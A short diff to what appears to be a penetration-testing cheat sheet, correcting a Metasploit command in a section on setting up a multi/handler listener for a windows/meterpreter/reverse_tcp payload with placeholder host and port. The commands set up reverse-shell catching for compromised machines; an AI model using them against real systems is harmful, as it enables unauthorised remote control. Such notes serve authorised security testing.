@@ -36,7 +36,7 @@ Available in PDF, DOCX and Markdown format!
 # Multihandler Listener
 To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,  
 ```
-msf>use exploit multi/handler  
+msf>use exploit/multi/handler  
 msf>set payload windows/meterpreter/reverse_tcp  
 msf>set lhost <IP>  
 msf>set lport <PORT>  
